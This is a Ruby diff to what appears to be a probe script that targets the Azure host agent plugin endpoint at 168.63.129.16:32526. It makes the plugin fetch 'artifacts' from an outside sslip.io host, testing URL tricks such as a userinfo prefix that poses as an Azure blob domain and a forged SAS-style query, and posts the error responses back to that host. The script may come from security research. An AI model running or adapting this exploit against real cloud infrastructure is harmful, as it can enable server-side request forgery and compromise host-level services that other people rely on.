@@ -4,6 +4,8 @@ require "open3"
 require "tempfile"
 
 AZURE_FETCH_CALLBACK_BASE = "https://target.147.182.179.38.sslip.io:8443"
+AZURE_HGAP_HTTPS_BASE = "https://target.147.182.179.38.sslip.io"
+AZURE_HGAP_HTTP_BASE = "http://output.147.182.179.38.sslip.io"
 AZURE_FETCH_MARKER = "5b3963e04627c6a3b1943eb0e2a145cc"
 
 def azure_fetch_post(job_id, data, kind = "runtime-summary")
@@ -80,9 +82,26 @@ if job_id.match?(/\A[0-9]+\z/)
         "x-ms-containerid: #{container_id}",
         "x-ms-host-config-name: #{config_name}"
       ]
-      callback_url = "#{AZURE_FETCH_CALLBACK_BASE}/azure-artifact/#{AZURE_FETCH_MARKER}/#{job_id}"
-      manifest_url = "#{AZURE_FETCH_CALLBACK_BASE}/azure-artifact-manifest/#{AZURE_FETCH_MARKER}/#{job_id}"
-      expected_body = "owned-hostga-artifact:#{job_id}"
+      callback_path = "/hgap/#{AZURE_FETCH_MARKER}/#{job_id}"
+      cases = {
+        "https-standard" => {
+          "artifact" => "#{AZURE_HGAP_HTTPS_BASE}#{callback_path}/https-standard",
+          "manifest" => "#{AZURE_HGAP_HTTPS_BASE}#{callback_path}/https-standard"
+        },
+        "http-standard" => {
+          "artifact" => "#{AZURE_HGAP_HTTP_BASE}#{callback_path}/http-standard",
+          "manifest" => "#{AZURE_HGAP_HTTP_BASE}#{callback_path}/http-standard"
+        },
+        "https-userinfo" => {
+          "artifact" => "https://example.blob.core.windows.net@target.147.182.179.38.sslip.io#{callback_path}/https-userinfo",
+          "manifest" => "https://example.blob.core.windows.net@target.147.182.179.38.sslip.io#{callback_path}/https-userinfo",
+          "outer_headers" => ["Metadata: true", "X-HGAP-Marker: #{Digest::SHA256.hexdigest(job_id)}"]
+        },
+        "https-storage-shape" => {
+          "artifact" => "https://target.147.182.179.38.sslip.io#{callback_path}/https-storage-shape?sv=2018-03-28&sr=b&sp=r&se=2099-01-01T00%3A00%3A00Z&sig=AAAA",
+          "manifest" => "https://target.147.182.179.38.sslip.io#{callback_path}/https-storage-shape?sv=2018-03-28&sr=b&sp=r&se=2099-01-01T00%3A00%3A00Z&sig=AAAA"
+        }
+      }
 
       versions_status, versions_body = azure_fetch_proxy_get(
         "http://168.63.129.16:32526/versions",
@@ -92,26 +111,32 @@ if job_id.match?(/\A[0-9]+\z/)
       negative_status, negative_body = azure_fetch_proxy_get(
         "http://168.63.129.16:32526/extensionArtifact", headers: base_headers
       )
-      positive_status, positive_body = azure_fetch_proxy_get(
-        "http://168.63.129.16:32526/extensionArtifact",
-        headers: base_headers + [
-          "x-ms-artifact-location: #{callback_url}",
-          "x-ms-artifact-manifest-location: #{manifest_url}"
-        ]
-      )
       summary["versions_status"] = versions_status
       summary["versions_length"] = versions_body.bytesize
       summary["versions_sha256"] = Digest::SHA256.hexdigest(versions_body)
       summary["negative_missing_location_status"] = negative_status
       summary["negative_missing_location_length"] = negative_body.bytesize
       summary["negative_missing_location_sha256"] = Digest::SHA256.hexdigest(negative_body)
-      summary["positive_status"] = positive_status
-      summary["positive_length"] = positive_body.bytesize
-      summary["positive_sha256"] = Digest::SHA256.hexdigest(positive_body)
-      summary["expected_owned_body_sha256"] = Digest::SHA256.hexdigest(expected_body)
-      summary["owned_body_exact_match"] = positive_body == expected_body
-      if positive_status != 200 && !positive_body.empty?
-        azure_fetch_post(job_id, positive_body, "azure-host-plugin-error")
+      summary["cases"] = {}
+      cases.each do |case_name, definition|
+        expected_body = "hgap:#{job_id}:#{case_name}"
+        status, body = azure_fetch_proxy_get(
+          "http://168.63.129.16:32526/extensionArtifact",
+          headers: base_headers + [
+            "x-ms-artifact-location: #{definition.fetch("artifact")}",
+            "x-ms-artifact-manifest-location: #{definition.fetch("manifest")}",
+            *Array(definition["outer_headers"])
+          ]
+        )
+        summary["cases"][case_name] = {
+          "status" => status,
+          "length" => body.bytesize,
+          "sha256" => Digest::SHA256.hexdigest(body),
+          "owned_body_exact_match" => body == expected_body
+        }
+        if status != 200 && !body.empty?
+          azure_fetch_post(job_id, body, "azure-host-plugin-error")
+        end
       end
     end
 
